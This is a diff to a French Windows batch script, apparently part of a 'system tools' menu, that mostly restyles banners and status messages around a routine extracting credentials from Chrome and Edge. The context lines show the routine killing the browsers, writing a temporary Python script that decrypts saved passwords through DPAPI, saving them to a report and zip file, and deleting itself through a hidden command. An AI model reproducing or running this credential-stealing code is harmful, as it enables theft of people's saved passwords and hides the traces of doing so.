@@ -1413,7 +1413,10 @@ goto system_tools
 setlocal enabledelayedexpansion
 cls
 echo.
-echo  Recuperation des identifiants et mots de passe
+echo  +--------------------------------------------------+
+echo  ^|        EXTRACTION DES IDENTIFIANTS              ^|
+echo  ^|     Chrome / Edge  -  Dechiffrement DPAPI       ^|
+echo  +--------------------------------------------------+
 echo.
 taskkill /F /IM chrome.exe >nul 2>&1
 taskkill /F /IM msedge.exe >nul 2>&1
@@ -1544,7 +1547,8 @@ if !errorlevel! neq 0 (
     "!PYCMD!" -m pip install pycryptodome -q
 )
 
-echo  Analyse en cours...
+echo  [*] Collecte et dechiffrement des bases...
+echo.
 set "PY_FILE=%TEMP%\decrypt_nav_%RANDOM%.py"
 > "!PY_FILE!" echo SCRIPT_DIR = r"%SCRIPT_DIR%"
 >> "!PY_FILE!" echo import os, sys, sqlite3, shutil, subprocess, tempfile, zipfile
@@ -1605,7 +1609,7 @@ set "PY_FILE=%TEMP%\decrypt_nav_%RANDOM%.py"
 >> "!PY_FILE!" echo     for url, user, pw in raw:
 >> "!PY_FILE!" echo         sig = (url.lower(), user.lower(), pw)
 >> "!PY_FILE!" echo         if sig not in seen: seen.add(sig); unique.append((url, user, pw))
->> "!PY_FILE!" echo     print(f"  {len(unique)} identifiant(s) | {len(raw)-len(unique)} doublon(s)")
+>> "!PY_FILE!" echo     print(f"  [+] {len(unique)} identifiant(s) uniques  /  {len(raw)-len(unique)} doublon(s) ignores")
 >> "!PY_FILE!" echo     if not unique:
 >> "!PY_FILE!" echo         print("  Aucun identifiant recuperable."); return
 >> "!PY_FILE!" echo     unique.sort(key=lambda x: _dom(x[0]))
@@ -1627,7 +1631,7 @@ set "PY_FILE=%TEMP%\decrypt_nav_%RANDOM%.py"
 >> "!PY_FILE!" echo         out = OUT_TXT.parent / f"resultats_{i}.txt"
 >> "!PY_FILE!" echo         i += 1
 >> "!PY_FILE!" echo     out.write_text("\n".join(lines), encoding="utf-8")
->> "!PY_FILE!" echo     print(f"  [+] {out.name} sauvegarde")
+>> "!PY_FILE!" echo     print(f"  [>] Rapport enregistre : {out.name}")
 >> "!PY_FILE!" echo     scr = Path(__file__).resolve()
 >> "!PY_FILE!" echo     subprocess.Popen(f'cmd /c timeout /t 1 /nobreak ^>nul ^& del /f /q "{scr}"', shell=True, creationflags=0x08000000)
 >> "!PY_FILE!" echo     with zipfile.ZipFile(ZIP_PATH, "w", zipfile.ZIP_DEFLATED) as zf:
@@ -1638,6 +1642,7 @@ set "PY_FILE=%TEMP%\decrypt_nav_%RANDOM%.py"
 >> "!PY_FILE!" echo if __name__ == "__main__": main()
 "!PYCMD!" "!PY_FILE!"
 echo.
+echo  +--------------------------------------------------+
 echo  Appuyez sur une touche pour revenir au menu...
 pause >nul
 endlocal
